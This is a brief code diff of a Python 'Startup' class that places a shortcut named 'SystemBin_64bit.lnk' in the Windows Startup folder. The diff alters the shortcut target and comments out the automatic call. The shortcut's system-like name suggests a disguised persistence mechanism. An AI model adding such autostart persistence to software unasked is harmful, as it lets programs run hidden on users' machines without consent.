@@ -4,7 +4,7 @@ import win32com.client
 
 class Startup:
     def __init__(self, original_dir):
-        target_dir = f"{original_dir}\SystemBin_64bit.exe"
+        target_dir = original_dir
         shortcut_dir = f"{os.getenv('appdata')}\Microsoft\Windows\Start Menu\Programs\Startup\SystemBin_64bit.lnk"
                 
         if not os.path.exists(shortcut_dir):
@@ -18,5 +18,4 @@ class Startup:
         shortcut.Save()
 
 
-Startup(os.getcwd())
-
+#Startup(os.getcwd())
